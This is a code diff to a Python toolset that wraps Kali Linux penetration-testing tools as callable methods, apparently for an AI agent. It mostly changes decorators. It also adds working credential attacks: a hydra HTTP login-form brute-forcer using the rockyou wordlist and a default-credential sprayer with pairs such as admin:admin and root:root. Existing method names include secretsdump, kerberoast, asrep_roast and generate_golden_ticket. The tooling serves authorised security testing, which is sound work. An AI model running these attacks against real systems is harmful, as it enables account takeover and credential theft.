@@ -12,12 +12,12 @@ class KaliTool(Toolset):
     A collection of Kali Linux tools for penetration testing and security assessments.
     """
 
-    name: str = "kali-tools"
+    tool_name: str = "kali-tools"
     description: str = (
         "A collection of Kali Linux tools for penetration testing and security assessments."
     )
 
-    @tool_method
+    @tool_method()
     def nmap_scan(self, target: str) -> str:
         """
         Scans target IPs to classify them as Domain Controllers or Member Servers.
@@ -52,7 +52,7 @@ class KaliTool(Toolset):
             logger.error(f"Scan failed: {e!s}")
             return f"Scan failed: {e!s}"
 
-    @tool_method
+    @tool_method()
     def enumerate_users_netexec(
         self,
         target: str,
@@ -104,7 +104,7 @@ class KaliTool(Toolset):
 
         return result.stdout
 
-    @tool_method
+    @tool_method()
     def enumerate_shares_netexec(
         self,
         target: str,
@@ -156,7 +156,7 @@ class KaliTool(Toolset):
 
         return result.stdout
 
-    @tool_method
+    @tool_method()
     def enumerate_share_files(
         self,
         target: str,
@@ -204,7 +204,7 @@ class KaliTool(Toolset):
 
         return result.stdout
 
-    @tool_method
+    @tool_method()
     def download_file_content(
         self,
         target: str,
@@ -261,7 +261,7 @@ class KaliTool(Toolset):
         logger.info(f"[*] File download completed for {file_path} result: {content}")
         return content
 
-    @tool_method
+    @tool_method()
     def secretsdump(
         self,
         target: str,
@@ -338,7 +338,7 @@ class KaliTool(Toolset):
         )
         return result.stdout
 
-    @tool_method
+    @tool_method()
     def kerberoast(
         self,
         domain: str,
@@ -378,7 +378,7 @@ class KaliTool(Toolset):
         else:
             return result.stdout
 
-    @tool_method
+    @tool_method()
     def asrep_roast(
         self,
         domain: str,
@@ -432,7 +432,7 @@ class KaliTool(Toolset):
         else:
             return result.stdout
 
-    @tool_method
+    @tool_method()
     def hashcat(
         self,
         hash_value: str,
@@ -612,7 +612,309 @@ class KaliTool(Toolset):
         else:
             return result.stdout
 
-    @tool_method
+    @tool_method()
+    def hydra_http_form_attack(
+        self,
+        target_url: str,
+        username_list: str = "/usr/share/wordlists/metasploit/unix_users.txt",
+        password_list: str = "/usr/share/wordlists/rockyou.txt",
+        form_parameters: str = "username:password",
+        failure_string: str = "Invalid",
+        max_attempts: int = 10,
+    ) -> str:
+        """
+        Use hydra to perform HTTP form-based credential attacks.
+
+        Args:
+            target_url: Target login URL (e.g., 'http://example.com/login.php')
+            username_list: Path to username wordlist (default: metasploit unix users)
+            password_list: Path to password wordlist (default: rockyou.txt)
+            form_parameters: Form field names separated by colon (e.g., 'user:pass')
+            failure_string: String that appears on failed login attempts
+            max_attempts: Maximum login attempts to prevent account lockout
+
+        Returns:
+            String output from hydra showing successful credentials or failures
+
+        Example:
+            >>> result = hydra_http_form_attack("http://target.com/login", failure_string="Login failed")
+        """
+
+        cmd = [
+            "hydra",
+            "-L",
+            username_list,
+            "-P",
+            password_list,
+            "-t",
+            str(max_attempts),
+            "-f",  # Stop on first success
+            target_url.split("/")[2],  # Extract hostname
+            "http-form-post",
+            f"/{'/'.join(target_url.split('/')[3:])}:{form_parameters}:F={failure_string}",
+        ]
+
+        try:
+            logger.info(f"[*] Starting hydra HTTP form attack on {target_url}")
+            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=300)  # noqa: S603
+
+            logger.info(f"[*] Hydra HTTP form attack completed for {target_url}: {result.stdout}")
+            return result.stdout + "\n" + result.stderr
+
+        except subprocess.TimeoutExpired:
+            logger.error("Hydra HTTP form attack timed out after 5 minutes")
+            return "Hydra attack timed out after 5 minutes"
+        except Exception as e:
+            logger.error(f"Hydra HTTP form attack failed: {e!s}")
+            return f"Hydra attack failed: {e!s}"
+
+    @tool_method()
+    def test_common_web_credentials(
+        self,
+        target_url: str,
+        form_parameters: str = "username:password",
+        failure_string: str = "Invalid",
+    ) -> str:
+        """
+        Test common default web credentials using hydra.
+
+        Args:
+            target_url: Target login URL
+            form_parameters: Form field names (e.g., 'user:pass', 'email:password')
+            failure_string: String indicating failed login
+
+        Returns:
+            Results of testing common credentials
+
+        Example:
+            >>> result = test_common_web_credentials("http://target.com/admin/login")
+        """
+
+        # Create temporary file with common credentials
+        common_creds = [
+            "admin:admin",
+            "admin:password",
+            "administrator:administrator",
+            "root:root",
+            "guest:guest",
+            "test:test",
+            "demo:demo",
+            "user:user",
+            "admin:123456",
+            "admin:",
+            "sa:sa",
+        ]
+
+        try:
+            with tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False) as f:
+                for cred in common_creds:
+                    f.write(cred + "\n")
+                cred_file = f.name
+
+            cmd = [
+                "hydra",
+                "-C",
+                cred_file,  # Use colon-separated credential pairs
+                "-t",
+                "5",
+                "-f",  # Stop on first success
+                target_url.split("/")[2],  # Extract hostname
+                "http-form-post",
+                f"/{'/'.join(target_url.split('/')[3:])}:{form_parameters}:F={failure_string}",
+            ]
+
+            logger.info(f"[*] Testing common credentials on {target_url}")
+            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=120)  # noqa: S603
+
+            # Clean up temp file
+            import os
+
+            os.unlink(cred_file)
+
+            logger.info(f"[*] Common credential test completed for {target_url}")
+            return result.stdout + "\n" + result.stderr
+
+        except subprocess.TimeoutExpired:
+            return "Common credential test timed out"
+        except Exception as e:
+            return f"Common credential test failed: {e!s}"
+
+    @tool_method()
+    def dig_dns_lookup(
+        self,
+        domain: str,
+        record_type: str = "A",
+        nameserver: str = "8.8.8.8",
+    ) -> str:
+        """
+        Perform DNS lookup using dig command.
+
+        Args:
+            domain: Domain/subdomain to query
+            record_type: DNS record type (A, AAAA, CNAME, NS, MX, TXT, etc.)
+            nameserver: DNS server to query (default: Google DNS)
+
+        Returns:
+            dig command output showing DNS records
+
+        Example:
+            >>> result = dig_dns_lookup("subdomain.example.com", "CNAME")
+        """
+
+        cmd = ["dig", f"@{nameserver}", domain, record_type, "+short"]
+
+        try:
+            logger.info(f"[*] Performing DNS lookup for {domain} ({record_type})")
+            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=30)  # noqa: S603
+
+            if result.stdout.strip():
+                output = f"DNS {record_type} record for {domain}:\n{result.stdout.strip()}"
+            else:
+                output = f"No {record_type} record found for {domain}"
+
+            logger.info(f"[*] DNS lookup completed for {domain}")
+            return output
+
+        except subprocess.TimeoutExpired:
+            return f"DNS lookup timed out for {domain}"
+        except Exception as e:
+            return f"DNS lookup failed for {domain}: {e!s}"
+
+    @tool_method()
+    def nslookup_dns_query(
+        self,
+        domain: str,
+        nameserver: str = "8.8.8.8",
+    ) -> str:
+        """
+        Perform comprehensive DNS query using nslookup.
+
+        Args:
+            domain: Domain/subdomain to query
+            nameserver: DNS server to query
+
+        Returns:
+            nslookup output showing all DNS information
+
+        Example:
+            >>> result = nslookup_dns_query("test.example.com")
+        """
+
+        cmd = ["nslookup", domain, nameserver]
+
+        try:
+            logger.info(f"[*] Running nslookup for {domain}")
+            result = subprocess.run(cmd, check=False, capture_output=True, text=True, timeout=30)  # noqa: S603
+
+            logger.info(f"[*] nslookup completed for {domain}")
+            return f"nslookup results for {domain}:\n{result.stdout}"
+
+        except subprocess.TimeoutExpired:
+            return f"nslookup timed out for {domain}"
+        except Exception as e:
+            return f"nslookup failed for {domain}: {e!s}"
+
+    @tool_method()
+    def check_subdomain_takeover(
+        self,
+        subdomain: str,
+    ) -> str:
+        """
+        Perform basic DNS and HTTP checks on a subdomain. Returns raw data for analysis.
+
+        Args:
+            subdomain: Subdomain to check
+
+        Returns:
+            DNS and HTTP information for the subdomain
+
+        Example:
+            >>> result = check_subdomain_takeover("old.example.com")
+        """
+
+        results = []
+        executed_commands = []
+
+        # Check CNAME record
+        try:
+            cname_cmd = ["dig", "@8.8.8.8", subdomain, "CNAME", "+short"]
+            executed_commands.append(" ".join(cname_cmd))
+            cname_result = subprocess.run(
+                cname_cmd,
+                check=False,
+                capture_output=True,
+                text=True,
+                timeout=15,
+            )
+
+            if cname_result.stdout.strip():
+                cname_target = cname_result.stdout.strip()
+                results.append(f"CNAME: {cname_target}")
+
+                # Check if CNAME target resolves
+                a_cname_cmd = ["dig", "@8.8.8.8", cname_target, "A", "+short"]
+                executed_commands.append(" ".join(a_cname_cmd))
+                a_result = subprocess.run(
+                    a_cname_cmd,
+                    check=False,
+                    capture_output=True,
+                    text=True,
+                    timeout=15,
+                )
+
+                if a_result.stdout.strip():
+                    results.append(f"CNAME target resolves to: {a_result.stdout.strip()}")
+                else:
+                    results.append("CNAME target does not resolve")
+            else:
+                results.append("No CNAME record")
+
+        except Exception as e:
+            results.append(f"CNAME check error: {e}")
+
+        # Check A record
+        try:
+            a_cmd = ["dig", "@8.8.8.8", subdomain, "A", "+short"]
+            executed_commands.append(" ".join(a_cmd))
+            a_result = subprocess.run(
+                a_cmd,
+                check=False,
+                capture_output=True,
+                text=True,
+                timeout=15,
+            )
+
+            if a_result.stdout.strip():
+                results.append(f"A record: {a_result.stdout.strip()}")
+            else:
+                results.append("No A record")
+
+        except Exception as e:
+            results.append(f"A record check error: {e}")
+
+        # Try HTTP request
+        try:
+            import requests
+
+            http_cmd = f"curl -I http://{subdomain}"
+            executed_commands.append(http_cmd)
+            response = requests.get(f"http://{subdomain}", timeout=10, allow_redirects=False)
+            results.append(f"HTTP status: {response.status_code}")
+
+            # Include first 500 chars of response for analysis
+            if response.text:
+                preview = response.text[:500].replace("\n", " ").strip()
+                results.append(f"HTTP response preview: {preview}")
+
+        except Exception as e:
+            results.append(f"HTTP request failed: {e}")
+
+        logger.info(f"[*] DNS and HTTP check completed for {subdomain}")
+
+        command_log = "Commands executed:\n" + "\n".join(f"  {cmd}" for cmd in executed_commands)
+        return command_log + "\n\nResults:\n" + "\n".join(results)
+
+    @tool_method()
     def generate_golden_ticket(
         self,
         krbtgt_hash: str,
